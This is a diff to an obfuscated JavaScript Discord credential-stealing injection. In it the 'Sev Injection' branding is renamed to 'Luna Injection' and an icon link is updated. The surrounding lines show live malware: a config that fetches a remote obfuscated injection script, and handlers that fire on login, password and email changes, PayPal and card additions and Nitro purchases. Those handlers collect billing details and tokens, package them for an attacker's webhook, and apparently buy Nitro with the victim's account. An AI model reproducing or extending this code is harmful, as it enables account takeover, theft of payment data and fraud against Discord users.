@@ -14,7 +14,7 @@ const config = {
   'ping_on_run': false,
   'ping_val': "@everyone",
   'embed_name': "Sev Injection",
-  'embed_icon': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d30462&is=66d1b2e2&hm=0aebe89249d0677d8e7df0a15d7122e33a1d9cb555afb3b8f4c59ddc170dd8ac&=",
+  'embed_icon': "https://media.discordapp.net/attachments/1268916054092939297/1279046507638685696/tenor.gif?ex=66d3ad22&is=66d25ba2&hm=588bb5c732579cd2befb454b74f5fc441a6bed6dfbbb04013a0b6f2318994eee&=",
   'embed_color': 0x560ddc,
   'injection_url': "https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js",
   'api': "https://discord.com/api/v9/users/@me",
@@ -540,7 +540,7 @@ const login = async (_0x94f435, _0x1dfaa7, _0x6db126) => {
   const _0x5d50b2 = getBadges(_0x3d0f03.flags);
   const _0x5d2eb6 = await getBilling(_0x6db126);
   const _0x25ca5e = {
-    'username': "Sev Injection",
+    'username': "Luna Injection",
     'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
     'embeds': [{
       'color': 0x560ddc,
@@ -571,7 +571,7 @@ const passwordChanged = async (_0x1fdea5, _0x5a716c, _0x522cab) => {
   const _0x37e22d = getBadges(_0xf80a5a.flags);
   const _0x4fa9e2 = await getBilling(_0x522cab);
   const _0xd92ef1 = {
-    'username': "Sev Injection",
+    'username': "Luna Injection",
     'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
     'embeds': [{
       'color': 0x560ddc,
@@ -602,7 +602,7 @@ const emailChanged = async (_0x58509b, _0x148e63, _0x3b9416) => {
   const _0x468ff2 = getBadges(_0x22bb05.flags);
   const _0xd7cfa6 = await getBilling(_0x3b9416);
   const _0x8022f = {
-    'username': "Sev Injection",
+    'username': "Luna Injection",
     'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
     'embeds': [{
       'color': 0x560ddc,
@@ -633,7 +633,7 @@ const PaypalAdded = async _0x4e0300 => {
   const _0x5129ab = getBadges(_0x1ab2ef.flags);
   const _0x595468 = getBilling(_0x4e0300);
   const _0x236cc8 = {
-    'username': "Sev Injection",
+    'username': "Luna Injection",
     'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
     'embeds': [{
       'color': 0x560ddc,
@@ -664,7 +664,7 @@ const ccAdded = async (_0x125a5f, _0x5e9c60, _0x4036d1, _0xf71a5c, _0x3dd805) =>
   const _0x3ba39b = getBadges(_0xd9c99b.flags);
   const _0x118bd8 = await getBilling(_0x3dd805);
   const _0x4fa649 = {
-    'username': "Sev Injection",
+    'username': "Luna Injection",
     'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
     'embeds': [{
       'color': 0x560ddc,
@@ -696,7 +696,7 @@ const nitroBought = async _0x9b73b7 => {
   const _0x3b557f = await getBilling(_0x9b73b7);
   const _0x3f19d9 = await buyNitro(_0x9b73b7);
   const _0x15eef6 = {
-    'username': "Sev Injection",
+    'username': "Luna Injection",
     'content': _0x3f19d9,
     'avatar_url': "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
     'embeds': [{
